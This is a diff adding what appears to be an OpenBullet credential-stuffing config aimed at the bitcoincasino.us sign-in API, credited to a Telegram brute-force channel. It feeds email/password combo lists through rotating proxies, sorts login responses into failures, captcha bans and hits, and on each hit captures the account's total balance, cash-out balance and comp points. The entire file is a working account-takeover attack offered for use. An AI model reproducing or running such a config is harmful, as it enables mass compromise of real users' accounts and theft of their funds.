@@ -1,0 +1,97 @@
+[SETTINGS]
+{
+  "Name": "BitCoinCasino.us",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-02T16:34:43.6286443+03:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Need Rotating Proxy | Capture | CPM Rate: 20-200",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.bitcoincasino.us/api/users/sign_in" 
+  CONTENT "{\"user\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/vnd.softswiss.v1+json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 88" 
+  HEADER "origin: https://www.bitcoincasino.us" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.bitcoincasino.us/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"email\":{\"not_found_in_database\":\"Invalid Email or password.\"}" 
+    KEY "\"Invalid email or password. Captcha is required." 
+  KEYCHAIN Ban OR 
+    KEY "{\"required\":[\"captcha\"]}" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES>" Contains "original_user_id" 
+
+#GB REQUEST GET "https://www.bitcoincasino.us/api/player/accounts" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/vnd.softswiss.v1+json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: no-cache" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.bitcoincasino.us/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+#Total_Balance PARSE "<SOURCE>" JSON "amount_cents" CreateEmpty=FALSE -> CAP "Total Balance" 
+
+PARSE "<SOURCE>" JSON "available_to_cashout_cents" CreateEmpty=FALSE -> CAP "Availabel Balance" 
+
+#GP REQUEST GET "https://www.bitcoincasino.us/api/player/comp_points" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/vnd.softswiss.v1+json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: no-cache" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.bitcoincasino.us/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+#points PARSE "<SOURCE>" JSON "points" CreateEmpty=FALSE -> CAP "points" 
+
